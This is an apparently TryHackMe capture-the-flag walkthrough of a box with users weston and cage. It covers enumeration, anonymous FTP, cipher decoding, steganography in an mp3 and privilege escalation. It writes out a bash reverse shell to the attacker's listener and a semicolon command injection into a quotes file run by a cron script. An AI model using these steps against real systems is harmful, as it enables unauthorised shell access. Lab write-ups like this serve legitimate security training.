If you use own VM you need to use VPN.

1. Download your VPN file on THM if you havenâ€™t done that already, find it and do following command: sudo openvpn FILE.ovpn
2. then hit your password and you ready to dive in...

I would like to add, do not use these tools on a network youre not allowed to scan, its illegal and they see what you do.
===================================================================
1. What is Weston's password?

Lets start with our old favorites, NMAP scan. nmap -sC -sV IP (ports open 21,22,80)
Also Gobuster to find hidden sites. gobuster dir -u http://IP:PORT -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
Meanwhile lets look at the website. I didnt find anything special, lets go deeper.

Lets try login to the FTP server as anonymous with no password, this we know from the nmap scan. Notice the dad_task.

ftp IP
anonymous
la -la
get dad_tasks
exit
cat dad_tasks

The file is encrypted so lets just decrypt it. If you find it dificult you could use: boxentriq.com/code-breaking/cipher-identifier
It will tell you its base64, decrypt the base64 with this: base64decode.org/ and you will see its still encrypted. Do the same
as we did first and you will see its specifik encrypted as Vigenere.

To decrypt Vigenere from dcode.fr/vigenere-cipher you need to have a key.

Gobuster found: /auditions that linked a mp3 file, I remember you can actually put information in any file, so I looked it up by using SonicVisualizer.

wget http://IP/auditions/must_practice_corrupt_file.mp3
ls
sudo apt-get install sonic-visualiser (Skip if you alredy have it installed)

Add the file to the SonicVisualizer and press pane>add spectrogram>all channels
Change color to sunset, zoom in!

2. What's the user flag?

Because we know from the mainpage its weston as a user, and we have the cracked password aswell for SSH port is open... we could SSH us in.

SSH weston@IP 
pwd (to see where we are)
ls -al (to see what we have, I didnt find anything here)
cd ..
ls (notice cage user, you can not sadly enter it. I guess here we find our flags)
sudo -l (/usr/bin/bees is root, lets use that to be cage)
/usr/bin/bees (to run the bash script, which is just a broadcast message)

find / -type f -user cage 2>/dev/null (You will find two other scripts, which is python scripts owned by the cage user)  
You could cat them (cat /opt/.dads_scripts/spread_the_quotes.py) and see what they do,
the first one is more of a function for the wall, so it spits out random words. And the other seems to be the file it reads from.

This is intresting. Lets netcat it to than create a reverse shell. Use the following code after NC to create a reverse shell.
I added rlwrap becuase I found it dificult to use without it. So I kept it for this writeup.

rlwrap nc -nlvp 4100

The IP may confuse you, its the IP adress of your machine, do an ip addr. 

cat > /tmp/shell.sh << EOF
#!/bin/bash
bash -i >& /dev/tcp/10.9.2.20/4100 0>&1
EOF

chmod +x /tmp/shell.sh
printf 'anything;/tmp/shell.sh\n' > /opt/.dads_scripts/.files/.quotes

Wait for some minutes, arround 3-4 minutes and you will soon get responce from the script. Crazy right? You CAGE!

ls
cat Super_Duper_Checklist

3. What's the root flag?

In the same CAGE user we also saw another file, lets look at it.
The email has this weird string "haiinspsyanileph" with key "face" if we crack it with
boxentriq.com/code-breaking/vigenere-cipher
we get this: cageisnotalegend
Lets try if it works on the 2nd terminal, the one we SSH with. We should be root! 

whoami (root? yepp)
cd /root
ls -al
cd email_backup
ls -al
cat email_2
